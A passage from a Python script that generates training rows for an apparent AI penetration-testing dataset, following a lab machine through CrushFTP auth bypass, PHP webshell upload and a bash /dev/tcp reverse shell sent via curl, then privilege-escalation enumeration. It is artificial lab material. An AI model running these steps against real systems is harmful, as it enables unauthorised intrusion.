#!/usr/bin/env python3
"""
Generate complete CSV rows for Soulmate machine

Action / MCP servers / MCP server usage / Results content below is sourced
from the real, already-collected Soulmate rows in Data/training_data.csv
(same walkthrough, same sequence of strategies) rather than re-authored by
hand, so this example matches the actual dataset schema and content exactly.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from dataset_generator_helper import create_csv_row, append_rows_to_csv

def generate_soulmate_rows():
    """Generate all CSV rows for Soulmate machine"""
    rows = []
    machine = "Soulmate"

    # Row 1: Initial reconnaissance
    ptt_1 = """1. Network Reconnaissance [to-do]
1.1. Perform initial port scan [to-do]
1.2. Identify running services [to-do]
2. Service Enumeration [to-do]"""

    row_1 = create_csv_row(
        machine=machine,
        ptt=ptt_1,
        previous_strategy="",
        previous_step="",
        previous_step_result="",
        new_strategy="Perform initial reconnaissance to identify open ports and running services",
        strategy_explanation="Beginning penetration test with standard network reconnaissance. Need to discover what services are exposed on the target system to identify potential attack vectors.",
        action=(
            "1. Execute a comprehensive Nmap scan against the target machine to identify all open TCP and UDP ports.\n"
            "2. Perform service version detection and OS fingerprinting on all discovered open ports to identify running software and versions.\n"
            "3. Run Nmap NSE default scripts against identified services to detect misconfigurations, exposed information, and common vulnerabilities.\n"
            "4. Document the attack surface based on identified services including web servers, SSH, FTP, SMB, and any other exposed protocols.\n"
            "5. Prioritize discovered services by exploitability and potential vulnerability risk to guide subsequent enumeration steps."
        ),
        mcp_servers=["Nmap"],
        mcp_server_usage=(
            "Nmap:\n"
            "* Perform a full TCP SYN scan with service version detection, OS fingerprinting, and default NSE scripts against the target IP.\n"
            "* Use flags: nmap -sS -sV -sC -O -p- -T4 <target_IP> to maximize coverage and discovery.\n"
            "* Expect: list of all open TCP ports, identified service names and version numbers, OS detection results, and NSE script output revealing potential misconfigurations or vulnerabilities."
        ),
        results=(
            "A comprehensive Nmap scan with version detection and NSE was run and revealed two open TCP services: SSH (22) and HTTP (80). "
            "The HTTP service redirects to a virtual host soulmate.htb, and a hosts entry (10.129.31.129 soulmate.htb) was added for convenience. "
            "No additional services were discovered by NSE at this stage. Next actions are focused web/vhost enumeration and deeper service enumeration."
        ),
    )
    rows.append(row_1)

    # Row 2: Port scan results
    ptt_2 = """1. Network Reconnaissance [completed]
1.1. Perform initial port scan [completed]: {Findings: TCP port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.}
1.2. Identify running services [completed]: {Findings: SSH and HTTP services identified}
2. Service Enumeration [to-do]
2.1. Enumerate HTTP service [to-do]
2.2. Perform subdomain enumeration [to-do]"""

    row_2 = create_csv_row(
        machine=machine,
        ptt=ptt_2,
        previous_strategy="Perform initial reconnaissance to identify open ports and running services",
        previous_step="A comprehensive Nmap scan with version detection and NSE was run against the target, establishing the initial attack surface before deciding on the next enumeration focus.",
        previous_step_result="TCP port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.",
        new_strategy="Enumerate the web application and discover subdomains",
        strategy_explanation="HTTP service redirects to soulmate.htb hostname, suggesting virtual host routing. Need to enumerate the main website and discover any additional subdomains that may expose different services or attack vectors.",
        action=(
            "1. Perform directory and file brute-forcing against the soulmate.htb web application to discover hidden endpoints, admin panels, and sensitive resources.\n"
            "2. Analyze the discovered web pages for technologies in use, framework versions, and application structure to identify potential vulnerabilities.\n"
            "3. Conduct subdomain fuzzing against soulmate.htb to enumerate virtual hosts and discover additional services or applications.\n"
            "4. Inspect discovered subdomain applications for separate entry points, login panels, or exposed functionality.\n"
            "5. Correlate discovered technologies and endpoints with known CVEs and public exploits to identify actionable attack paths."
        ),
        mcp_servers=["Dirbuster", "Web Page Analysis", "Google Search"],
        mcp_server_usage=(
            "Dirbuster:\n"
            "* Perform web directory and file brute-forcing against soulmate.htb using common wordlists.\n"
            "* Use a comprehensive wordlist (e.g., directory-list-2.3-medium.txt) and enumerate common extensions such as .php, .html, .txt, .bak.\n"
            "* Expect: hidden directories, admin pages, backup files, configuration endpoints, and any exposed application resources.\n\n"
            "Web Page Analysis:\n"
            "* Analyze the soulmate.htb homepage and any discovered pages for technology fingerprinting, CMS identification, and application behavior.\n"
            "* Inspect HTML source, JavaScript files, HTTP headers, and meta tags to identify frameworks, libraries, and software versions.\n"
            "* Expect: identified web technologies, CMS or framework versions, form structures, API endpoints, and hints toward the application's attack surface.\n\n"
            "Google Search:\n"
            "* Search for subdomains and virtual hosts associated with soulmate.htb, and research vulnerabilities in identified web technologies.\n"
            "* Query: 'soulmate.htb subdomain enumeration', 'nginx 1.18.0 vulnerabilities', and technology-specific CVEs discovered from web analysis.\n"
            "* Expect: additional virtual host names, relevant CVE listings for identified software, and technical writeups describing potential exploitation paths."
        ),
        results=(
            "Initial reconnaissance completed: TCP ports 22 and 80 are open; SSH identified as OpenSSH 8.9p1 (Ubuntu) and HTTP as nginx 1.18.0 which redirects to the vhost soulmate.htb. "
            "The TTL value indicates a Linux host one hop away. Next steps are web enumeration (directory/file brute-forcing and page analysis) and vhost/subdomain discovery to locate services like the CrushFTP interface."
        ),
    )
    rows.append(row_2)

    # Row 3: Web enumeration results
    ptt_3 = """1. Network Reconnaissance [completed]
1.1. Perform initial port scan [completed]: {Findings: TCP port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.}
1.2. Identify running services [completed]: {Findings: SSH and HTTP services identified}
2. Service Enumeration [completed]
2.1. Enumerate HTTP service [completed]: {Findings: PHP-based dating website at soulmate.htb with registration/login functionality. SQLite database (soulmate.db) discovered containing bcrypt-hashed admin credentials. File upload functionality exists but has restrictions.}
2.2. Perform subdomain enumeration [completed]: {Findings: Subdomain ftp.soulmate.htb discovered, responds with 302 redirect}
3. Vulnerability Analysis [to-do]
3.1. Analyze ftp subdomain [to-do]"""

    row_3 = create_csv_row(
        machine=machine,
        ptt=ptt_3,
        previous_strategy="Enumerate the web application and discover subdomains",
        previous_step="Directory brute-forcing and page analysis were run against soulmate.htb alongside subdomain fuzzing, aiming to surface hidden endpoints and any additional virtual hosts worth investigating.",
        previous_step_result="PHP-based dating website at soulmate.htb with registration/login functionality. SQLite database (soulmate.db) discovered containing bcrypt-hashed admin credentials. File upload functionality exists but has restrictions. Subdomain ftp.soulmate.htb discovered, responds with 302 redirect.",
        new_strategy="Investigate the ftp.soulmate.htb subdomain for additional services",
        strategy_explanation="Discovered additional subdomain ftp.soulmate.htb which may expose FTP or related file transfer services. This could provide alternative attack vectors beyond the main dating website.",
        action=(
            "1. Perform a full HTTP enumeration of the ftp.soulmate.htb virtual host to identify the application type, login pages, and exposed endpoints.\n"
            "2. Fingerprint the application running on ftp.soulmate.htb to determine its name, version, and underlying technology stack.\n"
            "3. Analyze HTTP response headers, page content, and JavaScript on ftp.soulmate.htb for version disclosure and configuration details.\n"
            "4. Research the identified application and version for known vulnerabilities, authentication bypasses, and public CVEs.\n"
            "5. Document the application's attack surface including available endpoints, authentication mechanisms, and exposed functionality for targeted exploitation."
        ),
        mcp_servers=["Web Page Analysis", "Google Search", "ExploitDB"],
        mcp_server_usage=(
            "Web Page Analysis:\n"
            "* Analyze the ftp.soulmate.htb web interface to identify the application, its version, login page structure, and exposed functionality.\n"
            "* Inspect HTTP response headers (Server, X-Powered-By), page source, and any visible version strings or copyright notices.\n"
            "* Expect: application name and version, technology stack details, available endpoints, authentication form details, and any version disclosure artifacts.\n\n"
            "Google Search:\n"
            "* Search for the identified application name and version to find known vulnerabilities, CVEs, and security advisories.\n"
            "* Query: '<application_name> <version> vulnerability CVE', '<application_name> authentication bypass exploit', and related security research.\n"
            "* Expect: CVE listings with CVSS scores, security advisories, technical writeups, and references to public PoC exploits for the identified application.\n\n"
            "ExploitDB:\n"
            "* Search ExploitDB and SearchSploit for exploits targeting the identified application name and version.\n"
            "* Use: searchsploit <application_name> <version> to identify available exploit scripts and PoC code.\n"
            "* Expect: matched exploit entries with descriptions, affected versions, and exploit code or references enabling direct exploitation attempts."
        ),
        results=(
            "Nmap revealed SSH (22) and HTTP (80), with the HTTP root redirecting to the vhost soulmate.htb (hosts file updated). Subdomain discovery found ftp.soulmate.htb, and HTTP fingerprinting "
            "identified a CrushFTP web interface with version v=11.W.657 exposed in the page source. Further vulnerability research against this CrushFTP version is pending."
        ),
    )
    rows.append(row_3)

    # Row 4: FTP subdomain analysis
    ptt_4 = """1. Network Reconnaissance [completed]
1.1. Perform initial port scan [completed]: {Findings: TCP port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.}
1.2. Identify running services [completed]: {Findings: SSH and HTTP services identified}
2. Service Enumeration [completed]
2.1. Enumerate HTTP service [completed]: {Findings: PHP-based dating website at soulmate.htb with registration/login functionality. SQLite database (soulmate.db) discovered containing bcrypt-hashed admin credentials. File upload functionality exists but has restrictions.}
2.2. Perform subdomain enumeration [completed]: {Findings: Subdomain ftp.soulmate.htb discovered, responds with 302 redirect}
3. Vulnerability Analysis [in-progress]
3.1. Analyze ftp subdomain [completed]: {Findings: CrushFTP instance running behind nginx reverse proxy. Java-based FTP server requiring authentication. CrushFTP version 10/11 detected.}
3.2. Research CrushFTP vulnerabilities [to-do]"""

    row_4 = create_csv_row(
        machine=machine,
        ptt=ptt_4,
        previous_strategy="Investigate the ftp.soulmate.htb subdomain for additional services",
        previous_step="The ftp.soulmate.htb virtual host was fingerprinted to identify the application behind it, since it could open an alternate route beyond the main dating website.",
        previous_step_result="CrushFTP instance running behind nginx reverse proxy. Java-based FTP server requiring authentication. CrushFTP version 10/11 detected.",
        new_strategy="Research CrushFTP vulnerabilities for potential exploitation",
        strategy_explanation="Identified CrushFTP version 10/11, which is a commercial FTP server. Need to research known vulnerabilities, particularly recent CVEs that may allow authentication bypass or remote code execution.",
        action=(
            "1. Search for technical details and security advisories on CVE-2025-31161 and CVE-2025-54309 affecting CrushFTP version 10 and 11.\n"
            "2. Review the authentication bypass mechanism in CVE-2025-31161 involving mishandled AWS S3-compatible authorization headers to understand the exploit vector.\n"
            "3. Investigate CVE-2025-54309 race condition in AS2 validation and how it can be combined with CVE-2025-31161 for reliable authentication bypass.\n"
            "4. Locate public proof-of-concept exploit code or scripts for CVE-2025-31161 and document the required HTTP request structure and payloads.\n"
            "5. Confirm the CrushFTP version running on ftp.soulmate.htb and validate that it falls within the affected version ranges for both CVEs."
        ),
        mcp_servers=["Google Search", "ExploitDB", "Web Page Analysis"],
        mcp_server_usage=(
            "Google Search:\n"
            "* Search for technical analyses, security advisories, and PoC code for CVE-2025-31161 and CVE-2025-54309 in CrushFTP.\n"
            "* Query: 'CVE-2025-31161 CrushFTP exploit PoC', 'CVE-2025-54309 CrushFTP authentication bypass', 'CrushFTP 10 11 AWS4-HMAC-SHA256 header bypass'.\n"
            "* Expect: detailed technical descriptions of both CVEs, required request formats, step-by-step exploitation guides, and links to working PoC scripts.\n\n"
            "ExploitDB:\n"
            "* Search ExploitDB for available exploit code targeting CrushFTP CVE-2025-31161 and related authentication bypass vulnerabilities.\n"
            "* Use: searchsploit CrushFTP and review all matching entries for version 10/11 exploits.\n"
            "* Expect: exploit scripts, HTTP request payloads, and exploitation notes directly applicable to the target CrushFTP instance.\n\n"
            "Web Page Analysis:\n"
            "* Analyze the CrushFTP web interface at ftp.soulmate.htb to confirm the exact version string and identify available API endpoints.\n"
            "* Inspect HTTP headers, response bodies, and login page source for version disclosure and API documentation hints.\n"
            "* Expect: confirmed CrushFTP version number, exposed API endpoint paths, and request structure details needed to craft the authentication bypass payload."
        ),
        results=(
            "Nmap and HTTP reconnaissance found SSH (22) and HTTP (80) with HTTP redirecting to the soulmate.htb vhost. Virtual-host enumeration discovered ftp.soulmate.htb serving a CrushFTP web/admin "
            "interface; page source indicates CrushFTP v10/v11. The service is confirmed reachable behind an nginx reverse proxy and its version places it in the scope for known CrushFTP issues "
            "(vulnerability research / PoC validation remains to-do)."
        ),
    )
    rows.append(row_4)

    # Row 5: Vulnerability research results
    ptt_5 = """1. Network Reconnaissance [completed]
1.1. Perform initial port scan [completed]: {Findings: TCP port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.}
1.2. Identify running services [completed]: {Findings: SSH and HTTP services identified}
2. Service Enumeration [completed]
2.1. Enumerate HTTP service [completed]: {Findings: PHP-based dating website at soulmate.htb with registration/login functionality. SQLite database (soulmate.db) discovered containing bcrypt-hashed admin credentials. File upload functionality exists but has restrictions.}
2.2. Perform subdomain enumeration [completed]: {Findings: Subdomain ftp.soulmate.htb discovered, responds with 302 redirect}
3. Vulnerability Analysis [completed]
3.1. Analyze ftp subdomain [completed]: {Findings: CrushFTP instance running behind nginx reverse proxy. Java-based FTP server requiring authentication. CrushFTP version 10/11 detected.}
3.2. Research CrushFTP vulnerabilities [completed]: {Findings: CVE-2025-31161 - Mishandled AWS S3-compatible authentication headers allowing user creation without credential validation. CVE-2025-54309 - Race condition in AS2 validation enabling authentication bypass. Both vulnerabilities allow admin user creation.}
4. Initial Access Exploitation [to-do]
4.1. Exploit CVE-2025-31161 or CVE-2025-54309 [to-do]"""

    row_5 = create_csv_row(
        machine=machine,
        ptt=ptt_5,
        previous_strategy="Research CrushFTP vulnerabilities for potential exploitation",
        previous_step="Public advisories and exploit databases were searched for CrushFTP authentication bypass vulnerabilities matching the detected version, to determine a viable path to authenticated access.",
        previous_step_result="CVE-2025-31161 - Mishandled AWS S3-compatible authentication headers allowing user creation without credential validation. CVE-2025-54309 - Race condition in AS2 validation enabling authentication bypass. Both vulnerabilities allow admin user creation.",
        new_strategy="Exploit CrushFTP vulnerabilities to create admin user and gain access",
        strategy_explanation="Have identified two exploitable authentication bypass vulnerabilities. Either CVE-2025-31161 (AWS header exploitation) or CVE-2025-54309 (race condition) will allow creating an admin account in CrushFTP, providing authenticated access to the file server.",
        action=(
            "1. Craft a malicious HTTP request to the CrushFTP API using CVE-2025-31161, setting the Authorization header to the AWS4-HMAC-SHA256 format with a crafted username to bypass authentication.\n"
            "2. Send a POST request with an XML payload to the CrushFTP user management endpoint to create a new administrator account without valid credentials.\n"
            "3. Verify that the new admin account was successfully created by attempting authentication with the crafted credentials.\n"
            "4. Log in to the CrushFTP administration interface using the newly created admin credentials and enumerate accessible files, configurations, and user data.\n"
            "5. Leverage the admin access to extract sensitive information, download files, or pivot to further attack paths within the soulmate.htb environment."
        ),
        mcp_servers=["Interactive CLI", "Burp Suite", "File System Analysis"],
        mcp_server_usage=(
            "Interactive CLI:\n"
            "* Craft and send the CVE-2025-31161 exploit HTTP requests using curl or a Python script to interact with the CrushFTP API.\n"
            "* Execute: curl -X POST with crafted Authorization: AWS4-HMAC-SHA256 Credential=<username>/ header and XML body to the CrushFTP user creation endpoint.\n"
            "* Expect: HTTP 200 response confirming admin user creation, followed by successful authentication and access to the CrushFTP admin panel.\n\n"
            "Burp Suite:\n"
            "* Intercept and manipulate HTTP requests to the CrushFTP instance to precisely craft and iterate on the CVE-2025-31161 exploit payload.\n"
            "* Use the Repeater module to send custom POST requests with the AWS4-HMAC-SHA256 Authorization header and XML user-creation body, adjusting parameters as needed.\n"
            "* Expect: server responses confirming authentication bypass, new user creation, and access to protected CrushFTP administrative endpoints.\n\n"
            "File System Analysis:\n"
            "* After gaining admin access to CrushFTP, enumerate the accessible file system through the CrushFTP interface to discover sensitive files, credentials, and configuration data.\n"
            "* Navigate the CrushFTP virtual filesystem to inspect user home directories, uploaded files, and server configuration files.\n"
            "* Expect: SSH keys, credentials, application configuration files, and other sensitive data facilitating lateral movement or privilege escalation within the soulmate.htb environment."
        ),
        results=(
            "The tester exploited CrushFTP authentication bypasses (CVE-2025-31161 and CVE-2025-54309) to create and verify a new administrative account (walkthrough user 0xben). Admin web UI access "
            "was obtained on ftp.soulmate.htb, allowing enumeration of files, configurations, and extraction of sensitive information. This completes initial access via the CrushFTP admin creation "
            "and login steps recorded at this checkpoint."
        ),
    )
    rows.append(row_5)

    # Row 6: Exploitation success, enumerate CrushFTP
    ptt_6 = """1. Network Reconnaissance [completed]
1.1. Perform initial port scan [completed]: {Findings: TCP port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.}
1.2. Identify running services [completed]: {Findings: SSH and HTTP services identified}
2. Service Enumeration [completed]
2.1. Enumerate HTTP service [completed]: {Findings: PHP-based dating website at soulmate.htb with registration/login functionality. SQLite database (soulmate.db) discovered containing bcrypt-hashed admin credentials. File upload functionality exists but has restrictions.}
2.2. Perform subdomain enumeration [completed]: {Findings: Subdomain ftp.soulmate.htb discovered, responds with 302 redirect}
3. Vulnerability Analysis [completed]
3.1. Analyze ftp subdomain [completed]: {Findings: CrushFTP instance running behind nginx reverse proxy. Java-based FTP server requiring authentication. CrushFTP version 10/11 detected.}
3.2. Research CrushFTP vulnerabilities [completed]: {Findings: CVE-2025-31161 - Mishandled AWS S3-compatible authentication headers allowing user creation without credential validation. CVE-2025-54309 - Race condition in AS2 validation enabling authentication bypass. Both vulnerabilities allow admin user creation.}
4. Initial Access Exploitation [completed]
4.1. Exploit CVE-2025-31161 or CVE-2025-54309 [completed]: {Findings: Admin user created successfully in CrushFTP. Authenticated access to CrushFTP web interface achieved.}
5. Post-Exploitation [to-do]
5.1. Enumerate CrushFTP file system access [to-do]"""

    row_6 = create_csv_row(
        machine=machine,
        ptt=ptt_6,
        previous_strategy="Exploit CrushFTP vulnerabilities to create admin user and gain access",
        previous_step="The CVE-2025-31161 authentication bypass was exploited to create and verify a new administrator account, then used to log in to the CrushFTP admin interface.",
        previous_step_result="Admin user created successfully in CrushFTP. Authenticated access to CrushFTP web interface achieved.",
        new_strategy="Leverage CrushFTP admin access to gain code execution",
        strategy_explanation="Have admin access to CrushFTP. Need to explore file mounting capabilities to access the dating website source code directory (/app/webProd) and upload PHP webshell for code execution as www-data user.",
        action=(
            "1. Log into the CrushFTP admin interface using the newly created admin credentials and navigate to virtual file system (VFS) configuration.\n"
            "2. Identify available file mounting options and locate the directory path corresponding to the dating website document root (/app/webProd or similar web-accessible path).\n"
            "3. Configure a file system mount point in CrushFTP that maps to the web document root, enabling file upload access to that directory.\n"
            "4. Upload a PHP webshell (e.g., cmd.php) through CrushFTP's file management interface into the web-accessible document root.\n"
            "5. Verify the webshell is accessible by making an HTTP request to the target URL and confirming command execution output is returned."
        ),
        mcp_servers=["Web Page Analysis", "Interactive CLI", "File System Analysis"],
        mcp_server_usage=(
            "Web Page Analysis:\n"
            "* Analyze the CrushFTP admin web interface to map available configuration options, VFS settings, and file upload endpoints.\n"
            "* Browse the admin panel pages, inspect HTML forms and JavaScript to identify file mounting and upload functionality.\n"
            "* Expect: discovery of VFS mount configuration panels and file upload interface accessible via admin credentials.\n\n"
            "Interactive CLI:\n"
            "* Use the interactive session to craft and upload the PHP webshell file through CrushFTP's admin interface or API.\n"
            "* Execute HTTP requests (e.g., via curl) to the CrushFTP admin API endpoints to configure file mounts and perform file uploads.\n"
            "* Expect: successful file mount configuration to /app/webProd and confirmation that cmd.php is uploaded to the web root.\n\n"
            "File System Analysis:\n"
            "* Once webshell access is confirmed, enumerate the web root directory structure to verify upload location and identify other web application files.\n"
            "* Inspect the dating website document root for configuration files, hardcoded credentials, and the overall application layout.\n"
            "* Expect: web root directory listing showing uploaded webshell, application source files, and any configuration or credential files."
        ),
        results=(
            "Initial reconnaissance identified SSH (22) and HTTP (80) with the HTTP host redirecting to soulmate.htb. Vhost enumeration discovered ftp.soulmate.htb serving a CrushFTP web interface "
            "(version v=11.W.657). A public exploit for CVE-2025-31161 was used to create an admin user (e.g., 0xben) and authenticated admin access to the CrushFTP web interface was obtained. "
            "Post-exploitation actions (mounting web root, uploading/verifying a webshell, and subsequent escalation) remain to-do."
        ),
    )
    rows.append(row_6)

    # Row 7: File system access and webshell upload
    ptt_7 = """1. Network Reconnaissance [completed]
1.1. Perform initial port scan [completed]: {Findings: TCP port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.}
1.2. Identify running services [completed]: {Findings: SSH and HTTP services identified}
2. Service Enumeration [completed]
2.1. Enumerate HTTP service [completed]: {Findings: PHP-based dating website at soulmate.htb with registration/login functionality. SQLite database (soulmate.db) discovered containing bcrypt-hashed admin credentials. File upload functionality exists but has restrictions.}
2.2. Perform subdomain enumeration [completed]: {Findings: Subdomain ftp.soulmate.htb discovered, responds with 302 redirect}
3. Vulnerability Analysis [completed]
3.1. Analyze ftp subdomain [completed]: {Findings: CrushFTP instance running behind nginx reverse proxy. Java-based FTP server requiring authentication. CrushFTP version 10/11 detected.}
3.2. Research CrushFTP vulnerabilities [completed]: {Findings: CVE-2025-31161 - Mishandled AWS S3-compatible authentication headers allowing user creation without credential validation. CVE-2025-54309 - Race condition in AS2 validation enabling authentication bypass. Both vulnerabilities allow admin user creation.}
4. Initial Access Exploitation [completed]
4.1. Exploit CVE-2025-31161 or CVE-2025-54309 [completed]: {Findings: Admin user created successfully in CrushFTP. Authenticated access to CrushFTP web interface achieved.}
5. Post-Exploitation [completed]
5.1. Enumerate CrushFTP file system access [completed]: {Findings: File mounting to /app/webProd (dating website source) configured. PHP webshell uploaded as cmd.php to web root.}
5.2. Establish reverse shell [to-do]"""

    row_7 = create_csv_row(
        machine=machine,
        ptt=ptt_7,
        previous_strategy="Leverage CrushFTP admin access to gain code execution",
        previous_step="CrushFTP's VFS was mounted to the web document root and a PHP webshell was uploaded through the admin interface, with reachability confirmed via a direct HTTP request.",
        previous_step_result="File mounting to /app/webProd (dating website source) configured. PHP webshell uploaded as cmd.php to web root.",
        new_strategy="Execute webshell to establish reverse shell as www-data",
        strategy_explanation="Successfully uploaded PHP webshell (cmd.php) to the dating website document root. Now need to access the webshell through the web browser and execute reverse shell command to gain interactive shell access.",
        action=(
            "1. Confirm the webshell (cmd.php) is accessible by sending an HTTP request to http://soulmate.htb/cmd.php with a test command parameter.\n"
            "2. Set up a Netcat listener on the attacking machine on a chosen port (e.g., 4444) to receive the incoming reverse shell connection.\n"
            "3. Craft a bash reverse shell one-liner payload (e.g., bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1) URL-encoded and pass it to the webshell's command parameter.\n"
            "4. Trigger the reverse shell by sending the crafted HTTP request to the webshell URL and confirm the connection is received by the Netcat listener.\n"
            "5. Stabilize the reverse shell by upgrading to a fully interactive TTY using Python's pty module or script command, then verify shell context as www-data."
        ),
        mcp_servers=["Netcat", "Interactive CLI", "Web Page Analysis"],
        mcp_server_usage=(
            "Netcat:\n"
            "* Set up a reverse shell listener on the attacking machine to catch the incoming connection from the target.\n"
            "* Run: nc -lvnp 4444 to open the listener before triggering the payload via the webshell.\n"
            "* Expect: an interactive shell session as www-data user once the reverse shell payload executes on the target.\n\n"
            "Interactive CLI:\n"
            "* Construct and deliver the reverse shell payload via HTTP request to the cmd.php webshell endpoint.\n"
            "* Use curl or wget to send: curl 'http://soulmate.htb/cmd.php?cmd=bash+-i+>%26+/dev/tcp/<attacker-ip>/4444+0>%261' to trigger execution.\n"
            "* Expect: the target connects back to the Netcat listener, establishing a www-data shell session.\n\n"
            "Web Page Analysis:\n"
            "* Inspect the webshell response and verify correct execution by testing with benign commands (e.g., id, whoami) before triggering the reverse shell.\n"
            "* Analyze any error output or HTTP responses from the webshell to confirm it is functioning and identify any Web Application Firewall filtering.\n"
            "* Expect: confirmation that command execution is working through the webshell prior to launching the full reverse shell payload."
        ),
        results=(
            "Reconnaissance and vhost enumeration revealed ftp.soulmate.htb hosting CrushFTP (v=11.W.657). CVE-2025-31161 was exploited to create an admin-equivalent user (0xben) and grant write "
            "access to /app/webProd. A PHP webshell (cmd.php) was uploaded and used to trigger a bash reverse shell; a connection was received on the attacker listener and upgraded to an interactive "
            "TTY, yielding a www-data shell."
        ),
    )
    rows.append(row_7)

    # Row 8: Shell established, enumerate system
    ptt_8 = """1. Network Reconnaissance [completed]
1.1. Perform initial port scan [completed]: {Findings: TCP port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.}
1.2. Identify running services [completed]: {Findings: SSH and HTTP services identified}
2. Service Enumeration [completed]
2.1. Enumerate HTTP service [completed]: {Findings: PHP-based dating website at soulmate.htb with registration/login functionality. SQLite database (soulmate.db) discovered containing bcrypt-hashed admin credentials. File upload functionality exists but has restrictions.}
2.2. Perform subdomain enumeration [completed]: {Findings: Subdomain ftp.soulmate.htb discovered, responds with 302 redirect}
3. Vulnerability Analysis [completed]
3.1. Analyze ftp subdomain [completed]: {Findings: CrushFTP instance running behind nginx reverse proxy. Java-based FTP server requiring authentication. CrushFTP version 10/11 detected.}
3.2. Research CrushFTP vulnerabilities [completed]: {Findings: CVE-2025-31161 - Mishandled AWS S3-compatible authentication headers allowing user creation without credential validation. CVE-2025-54309 - Race condition in AS2 validation enabling authentication bypass. Both vulnerabilities allow admin user creation.}
4. Initial Access Exploitation [completed]
4.1. Exploit CVE-2025-31161 or CVE-2025-54309 [completed]: {Findings: Admin user created successfully in CrushFTP. Authenticated access to CrushFTP web interface achieved.}
5. Post-Exploitation [completed]
5.1. Enumerate CrushFTP file system access [completed]: {Findings: File mounting to /app/webProd (dating website source) configured. PHP webshell uploaded as cmd.php to web root.}
5.2. Establish reverse shell [completed]: {Findings: Reverse shell established as www-data user.}
6. Privilege Escalation Enumeration [to-do]
6.1. Search for credentials and sensitive files [to-do]"""

    row_8 = create_csv_row(
        machine=machine,
        ptt=ptt_8,
        previous_strategy="Execute webshell to establish reverse shell as www-data",
        previous_step="The webshell was triggered with a bash reverse shell payload, and the resulting connection was caught on a Netcat listener and upgraded to a stable interactive TTY.",
        previous_step_result="Reverse shell established as www-data user.",
        new_strategy="Enumerate system for privilege escalation vectors",
        strategy_explanation="Have www-data shell access. Need to enumerate the system for credentials, SSH keys, SUID binaries, running services, and configuration files that may enable lateral movement to another user or privilege escalation to root.",
        action=(
            "1. Enumerate user home directories and check for readable files such as .bash_history, SSH keys, credentials files, and application configuration files.\n"
            "2. Search common configuration file locations (/etc, /var/www, /opt, /app) for database credentials, API keys, and hardcoded passwords.\n"
            "3. Identify SUID and SGID binaries on the file system and cross-reference them against known privilege escalation vectors (e.g., GTFOBins).\n"
            "4. Examine currently running processes (ps aux) and scheduled tasks (crontab -l, /etc/cron.*) for scripts running as privileged users.\n"
            "5. Check installed software versions, kernel version (uname -a), and OS release for known local privilege escalation exploits.\n"
            "6. Inspect world-writable directories and files, particularly those owned by root or other privileged users that may be exploitable."
        ),
        mcp_servers=["File System Analysis", "Interactive CLI", "Google Search", "ExploitDB"],
        mcp_server_usage=(
            "File System Analysis:\n"
            "* Perform comprehensive enumeration of the target file system from the www-data shell context.\n"
            "* Traverse /home, /etc, /opt, /app, /var directories; search for credentials, SSH keys, config files, and SUID binaries using find commands.\n"
            "* Expect: discovery of readable credential files, hardcoded passwords in config files, SUID binaries, or scripts owned by privileged users.\n\n"
            "Interactive CLI:\n"
            "* Execute privilege escalation enumeration commands interactively within the www-data reverse shell session.\n"
            "* Run: find / -perm -4000 2>/dev/null (SUID), ps aux, crontab -l, cat /etc/passwd, uname -a, id, sudo -l.\n"
            "* Expect: a list of SUID binaries, running processes, cron jobs, and kernel/OS version details that inform escalation paths.\n\n"
            "Google Search:\n"
            "* Research privilege escalation techniques applicable to the identified OS version (Ubuntu), kernel version, and any notable running services.\n"
            "* Search for known vulnerabilities in identified software versions and services running on the target machine.\n"
            "* Expect: relevant CVEs, privilege escalation techniques, and exploit references for the discovered environment.\n\n"
            "ExploitDB:\n"
            "* Search for local privilege escalation exploits matching the kernel version and installed software versions discovered during enumeration.\n"
            "* Use searchsploit with version-specific queries against identified services and the OS kernel.\n"
            "* Expect: matching local exploits or proof-of-concept code that can be transferred to the target for privilege escalation."
        ),
        results=(
            "Active reconnaissance found TCP ports 22 and 80 and a vhost redirect to soulmate.htb; ftp.soulmate.htb hosts a CrushFTP web interface (version string v=11.W.657). The CrushFTP "
            "CVE-2025-31161 auth-bypass was exploited to create an admin-equivalent user (0xben), grant file access, and upload a PHP webshell to /app/webProd. A reverse shell was successfully "
            "obtained as the www-data user. Privilege-escalation enumeration has been started but remains to-do (searching for credentials, SUID binaries, cron/jobs, and service-specific configs)."
        ),
    )
    rows.append(row_8)

    # Row 9: Credential discovery
    ptt_9 = """1. Network Reconnaissance [completed]
1.1. Perform initial port scan [completed]: {Findings: TCP port 22 (SSH) - OpenSSH 8.9p1 Ubuntu, TCP port 80 (HTTP) - nginx 1.18.0 with redirect to soulmate.htb. TTL of 63 indicates Linux one hop away.}
1.2. Identify running services [completed]: {Findings: SSH and HTTP services identified}
2. Service Enumeration [completed]
2.1. Enumerate HTTP service [completed]: {Findings: PHP-based dating website at soulmate.htb with registration/login functionality. SQLite database (soulmate.db) discovered containing bcrypt-hashed admin credentials. File upload functionality exists but has restrictions.}
2.2. Perform subdomain enumeration [completed]: {Findings: Subdomain ftp.soulmate.htb discovered, responds with 302 redirect}
3. Vulnerability Analysis [completed]
3.1. Analyze ftp subdomain [completed]: {Findings: CrushFTP instance running behind nginx reverse proxy. Java-based FTP server requiring authentication. CrushFTP version 10/11 detected.}
